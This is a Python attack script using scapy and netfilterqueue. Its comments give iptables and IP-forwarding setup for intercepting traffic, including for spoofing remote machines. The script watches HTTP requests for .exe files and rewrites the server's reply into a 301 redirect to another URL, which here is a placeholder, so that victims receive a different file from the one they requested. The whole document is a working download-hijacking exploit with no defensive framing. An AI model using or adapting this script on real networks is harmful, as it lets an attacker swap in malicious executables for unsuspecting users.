
# Before running this script, you need to bind traffic to queue 0 in iptables
# $ iptables -I INPUT -j NFQUEUE --queue-num 0
# $ iptables -I OUTPUT -j NFQUEUE --queue-num 0

# For spoofing remote machines you need forward traffic
# $ iptables -I FORWARD -j NFQUEUE --queue-num 0

# Enable IP forwarding
# $ echo 1 > /proc/sys/net/ipv4/ip_forward

import netfilterqueue
import scapy.all as scapy

ackList = []

def setLoad(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet

def processPacket(packet):
	scapyPacket = scapy.IP(packet.get_payload())
	if scapyPacket.haslayer(scapy.Raw):
		if scapyPacket[scapy.TCP].dport == 80:
			if ".exe" in scapyPacket[scapy.Raw].load:
				print("[+] EXE Request")
				ackList.append(scapyPacket[scapy.TCP].ack)
		elif scapyPacket[scapy.TCP].sport == 80:
			if scapyPacket[scapy.TCP].seq in ackList:
				ackList.remove(scapyPacket[scapy.TCP].seq)
				print("[+] Replacing File")
				modifiedPacket = setLoad(scapyPacket, "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp\n\n")
				packet.set_payload(str(modifiedPacket))

	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, processPacket)
queue.run()